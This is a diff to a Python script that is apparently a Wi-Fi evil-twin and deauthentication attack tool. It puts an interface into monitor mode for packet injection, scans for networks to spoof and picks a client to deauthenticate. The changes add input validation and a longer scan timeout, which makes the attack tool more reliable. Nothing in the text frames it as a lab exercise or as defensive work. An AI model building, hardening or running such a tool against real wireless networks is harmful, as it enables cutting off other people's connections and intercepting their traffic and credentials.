@@ -39,6 +39,11 @@ def select_interfaces():
     iface_ap = input("Enter your AP interface (e.g., wlx244bfe3caac2): ").strip()
     iface_deauth = input("Enter your deauth interface (e.g., wlxc83a35c2fcb0): ").strip()
 
+    # Validate interfaces
+    if not os.path.exists(f"/sys/class/net/{iface_ap}") or not os.path.exists(f"/sys/class/net/{iface_deauth}"):
+        print("[-] One or both interfaces do not exist. Please check the interface names.")
+        exit(1)
+
     # Put the deauth interface into monitor mode for packet injection
     os.system(f"sudo ip link set {iface_deauth} down")
     os.system(f"sudo iwconfig {iface_deauth} mode monitor")
@@ -77,7 +82,7 @@ def scan_networks(iface):
     """
     clear()
     print("[2] Scanning for Wi-Fi networks...")
-    networks = scapy_scan(iface, timeout=10)
+    networks = scapy_scan(iface, timeout=60)
     
     if not networks:
         print("[-] No networks found.")
@@ -91,6 +96,10 @@ def scan_networks(iface):
     for i, (ssid, bssid, channel) in enumerate(networks):
         print(f"{i+1}) SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
     choice = int(input("Select a network to spoof: ")) - 1
+    # add error handling for invalid choice
+    if choice < 0 or choice >= len(networks):
+        print("[-] Invalid choice. Exiting.")
+        exit(1)
     selected = networks[choice]
     return selected[0], selected[1], selected[2]
 
@@ -116,6 +125,12 @@ def find_clients(iface, ssid, ap_mac):
     for i, mac in enumerate(clients):
         print(f"{i+1}) Client MAC: {mac}")
     choice = int(input("Select a client to deauth: ")) - 1
+
+    # add error handling for invalid choice
+    if choice < 0 or choice >= len(clients):
+        print("[-] Invalid choice. Exiting.")
+        exit(1)
+    
     return clients[choice]
 
 def create_evil_twin(ssid, iface, ap_mac):
